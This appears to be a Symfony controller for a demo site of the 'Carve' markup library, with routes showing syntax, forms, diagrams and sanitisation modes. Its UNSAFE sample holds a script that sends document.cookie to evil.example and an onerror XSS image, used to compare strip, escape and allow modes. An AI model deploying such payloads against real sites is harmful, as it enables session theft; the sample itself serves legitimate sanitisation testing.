<?php

declare(strict_types=1);

namespace App\Controller;

use App\Entity\Article;
use App\Form\ArticleType;
use MarkupCarve\Carve\SafeMode;
use MarkupCarve\SymfonyCarve\CarveRenderer;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\Routing\Attribute\Route;

class DemoController extends AbstractController
{
    private const SAMPLE = <<<'CARVE'
        # Welcome to Carve

        This is a paragraph with /italic/, *bold*, and _underline_ text.

        ## Features

        - Clean, consistent syntax
        - [x] Task lists work
        - [ ] Even unchecked ones

        > Carve is Djot minus the footguns.

        ### Code

        ``` php
        $html = (new CarveConverter())->convert('Hello *world*');
        ```

        Visit [the spec](https://github.com/markup-carve/carve) for the details.
        CARVE;

    private const UNSAFE = <<<'CARVE'
        # User Post

        Normal content here.

        <script>document.location='https://evil.example/?c='+document.cookie</script>

        <img src="x" onerror="alert('xss')">

        More normal content.
        CARVE;

    #[Route('/', name: 'home')]
    public function index(): Response
    {
        return $this->render('demo/index.html.twig');
    }

    #[Route('/twig-filter', name: 'twig_filter')]
    public function twigFilter(): Response
    {
        return $this->render('demo/twig_filter.html.twig', [
            'source' => self::SAMPLE,
        ]);
    }

    #[Route('/twig-function', name: 'twig_function')]
    public function twigFunction(): Response
    {
        return $this->render('demo/twig_function.html.twig', [
            'source' => self::SAMPLE,
        ]);
    }

    #[Route('/service', name: 'service')]
    public function service(CarveRenderer $carve): Response
    {
        return $this->render('demo/service.html.twig', [
            'source' => self::SAMPLE,
            'html' => $carve->render(self::SAMPLE),
        ]);
    }

    #[Route('/outputs-profiles', name: 'outputs_profiles')]
    public function outputsProfiles(CarveRenderer $carve): Response
    {
        $source = <<<'CARVE'
            # Release notes

            Carve /renders/ to *HTML*, plain text, and Markdown from one source.

            ![A diagram](diagram.svg)
            CARVE;
        $comment = new CarveRenderer(profile: 'comment');

        return $this->render('demo/outputs_profiles.html.twig', [
            'source' => $source,
            'html' => $carve->render($source),
            'text' => $carve->renderText($source),
            'markdown' => $carve->renderMarkdown($source),
            'comment_html' => $comment->render($source),
        ]);
    }

    #[Route('/form', name: 'form')]
    public function form(Request $request, CarveRenderer $carve): Response
    {
        $article = new Article();
        $article->setBody(self::SAMPLE);

        $form = $this->createForm(ArticleType::class, $article);
        $form->handleRequest($request);

        $preview = null;
        if ($form->isSubmitted() && $form->isValid()) {
            $preview = [
                'title' => $article->getTitle(),
                'body_html' => $carve->render($article->getBody()),
                'comment_html' => $article->getComment() !== null && $article->getComment() !== ''
                    ? $carve->render($article->getComment())
                    : null,
            ];
        }

        return $this->render('demo/form.html.twig', [
            'form' => $form,
            'preview' => $preview,
        ]);
    }

    #[Route('/safe-mode', name: 'safe_mode')]
    public function safeMode(): Response
    {
        return $this->render('demo/safe_mode.html.twig', [
            'source' => self::UNSAFE,
            'strip' => (new CarveRenderer(true, SafeMode::RAW_HTML_STRIP))->render(self::UNSAFE),
            'escape' => (new CarveRenderer(true, SafeMode::RAW_HTML_ESCAPE))->render(self::UNSAFE),
            'allow' => (new CarveRenderer(true, SafeMode::RAW_HTML_ALLOW))->render(self::UNSAFE),
            'disabled' => (new CarveRenderer(false))->render(self::UNSAFE),
        ]);
    }

    #[Route('/diagrams', name: 'diagrams')]
    public function diagrams(CarveRenderer $carve): Response
    {
        // The injected CarveRenderer is configured from config/packages/carve.yaml,
        // where all eight presets are enabled. With a preset enabled, a matching
        // fence renders as a hydration element (e.g. <pre class="mermaid">...)
        // instead of a plain code block. Each example below carries a fence CSS
        // class, a note on how it draws, and valid source so the client-side
        // library on the page can actually render it.
        $examples = [
            'Mermaid' => [
                'class' => 'mermaid',
                'renderer' => 'mermaid.js (CDN, client-side)',
                'note' => 'Rendered live by mermaid.js. The library loads from a CDN and draws entirely in the browser.',
                'source' => "``` mermaid\nflowchart LR\n    A[Write Carve] --> B{diagrams enabled?}\n    B -->|yes| C[hydration element]\n    B -->|no| D[plain code block]\n```",
            ],
            'Graphviz' => [
                'class' => 'graphviz',
                'renderer' => '@viz-js/viz WebAssembly (CDN, offline after load)',
                'note' => 'The dot source is rendered to SVG fully in-browser by the @viz-js/viz WebAssembly build. No server call.',
                'source' => "``` dot\ndigraph {\n    rankdir=LR;\n    Carve -> HTML -> Diagram;\n}\n```",
            ],
            'D2' => [
                'class' => 'd2',
                'renderer' => 'Kroki server (public kroki.io, needs network)',
                'note' => 'D2 has no small in-browser build, so the source is deflate-encoded and drawn through the public Kroki server. If the network is blocked the source stays visible.',
                'source' => "``` d2\nCarve -> HTML: convert\nHTML -> Diagram: hydrate\n```",
            ],
            'PlantUML' => [
                'class' => 'plantuml',
                'renderer' => 'plantuml.com server (~h hex encoding, needs network)',
                'note' => 'The source is hex-encoded and drawn by the public PlantUML server via its ~h scheme. If the network is blocked the source stays visible.',
                'source' => "``` plantuml\n@startuml\nAlice -> Bob: config option\nBob --> Alice: hydration markup\n@enduml\n```",
            ],
            'Vega-Lite' => [
                'class' => 'vega-lite',
                'renderer' => 'vega + vega-lite + vega-embed (CDN, client-side)',
                'note' => 'A Vega-Lite JSON spec rides in a <script type="application/json"> and is drawn by vega-embed. Note the fence word is vega-lite (hyphen); the config enum spells it vega_lite.',
                'source' => "``` vega-lite\n{\n  \"\$schema\": \"https://vega.github.io/schema/vega-lite/v5.json\",\n  \"data\": {\"values\": [\n    {\"engine\": \"PHP\", \"tier\": 3},\n    {\"engine\": \"JS\", \"tier\": 3},\n    {\"engine\": \"Rust\", \"tier\": 3}\n  ]},\n  \"mark\": \"bar\",\n  \"encoding\": {\n    \"x\": {\"field\": \"engine\", \"type\": \"nominal\"},\n    \"y\": {\"field\": \"tier\", \"type\": \"quantitative\"}\n  }\n}\n```",
            ],
            'WaveDrom' => [
                'class' => 'wavedrom',
                'renderer' => 'wavedrom + default skin (CDN, client-side)',
                'note' => 'A WaveDrom JSON timing spec, drawn to SVG by the wavedrom library.',
                'source' => "``` wavedrom\n{ \"signal\": [\n  { \"name\": \"clk\",  \"wave\": \"p......\" },\n  { \"name\": \"data\", \"wave\": \"x.34.5x\", \"data\": [\"a\", \"b\", \"c\"] }\n]}\n```",
            ],
            'Chart.js' => [
                'class' => 'chart',
                'renderer' => 'chart.js (CDN, client-side)',
                'note' => 'A Chart.js JSON config in a <script type="application/json">, drawn onto a <canvas> by chart.js.',
                'source' => "``` chart\n{\n  \"type\": \"bar\",\n  \"data\": {\n    \"labels\": [\"PHP\", \"JS\", \"Rust\"],\n    \"datasets\": [{ \"label\": \"Carve engines\", \"data\": [3, 3, 3] }]\n  },\n  \"options\": { \"responsive\": true }\n}\n```",
            ],
            'ABC' => [
                'class' => 'abc',
                'renderer' => 'abcjs (CDN, client-side)',
                'note' => 'ABC music notation rendered to a score (SVG) by abcjs.',
                'source' => "``` abc\nX:1\nT:Carve Scale\nM:4/4\nL:1/4\nK:C\nC D E F | G A B c |\n```",
            ],
        ];

        $rendered = [];
        foreach ($examples as $label => $example) {
            $rendered[$label] = [
                'class' => $example['class'],
                'renderer' => $example['renderer'],
                'note' => $example['note'],
                'source' => $example['source'],
                'html' => $carve->render($example['source']),
            ];
        }

        // Contrast: the same mermaid fence with diagrams turned off stays a plain,
        // escaped code block - the "before" side of the feature.
        $plainConverter = new CarveRenderer(true, SafeMode::RAW_HTML_STRIP, []);

        return $this->render('demo/diagrams.html.twig', [
            'examples' => $rendered,
            'disabled_html' => $plainConverter->render($examples['Mermaid']['source']),
        ]);
    }

    #[Route('/syntax', name: 'syntax')]
    public function syntax(CarveRenderer $carve): Response
    {
        // Core constructs plus the newer / convergence features Carve is known
        // for. Each renders live through the same CarveRenderer service.
        $examples = [
            'Headings' => "# Heading 1\n## Heading 2\n### Heading 3",
            'Emphasis' => "/italic/\n\n*bold*\n\n_underline_\n\n=highlight=\n\n~strikethrough~",
            'Superscript & subscript' => "Braced only: E = mc{^2^} and H{,2,}O.",
            'Lists' => "- one\n- two\n  - nested\n\n1. first\n2. second",
            'Task list' => "- [x] done\n- [ ] todo",
            'Tight vs loose lists' => "Tight (no blank lines):\n\n- one\n- two\n\nLoose (blank lines between items wrap each in a paragraph):\n\n- one\n\n- two",
            'Definition list' => ":: Carve\n:  A post-Markdown markup language.\n\n:: Djot\n:  The project Carve refines.",
            'Blockquote' => "> A quote\n> spanning lines.",
            'Link & image' => "[Carve spec](https://github.com/markup-carve/carve)",
            'Table' => "| Lang | Status |\n|------|--------|\n| PHP  | ready  |\n| JS   | ready  |",
            'Admonition' => "::: note\nThis is a note admonition.\n:::",
            'Footnotes' => "Carve supports real footnotes.[^spec]\n\n[^spec]: Defined once, linked and back-linked automatically.",
            'Smart typography' => "Ranges use -- an en dash -- and asides use --- an em dash. Ellipsis... and \"smart quotes\" and 'single' too.",
            'Strict column-0 markers' => "A paragraph.\n\n   # Indented three spaces, so this stays literal text, not a heading.\n\n# A real, column-0 heading",
        ];

        $rendered = [];
        foreach ($examples as $label => $src) {
            $rendered[$label] = ['source' => $src, 'html' => $carve->render($src)];
        }

        // Inline literal is a distinct, newer inline construct worth its own
        // side-by-side contrast with a normal code span.
        $inlineLiteral = [
            'source' => "A code span styles its content: `*not bold*`.\n\nAn inline literal shows the characters verbatim, with no code styling and no markup: !`*not bold*`.",
            'html' => $carve->render(
                "A code span styles its content: `*not bold*`.\n\nAn inline literal shows the characters verbatim, with no code styling and no markup: !`*not bold*`.",
            ),
        ];

        return $this->render('demo/syntax.html.twig', [
            'examples' => $rendered,
            'inline_literal' => $inlineLiteral,
        ]);
    }
}
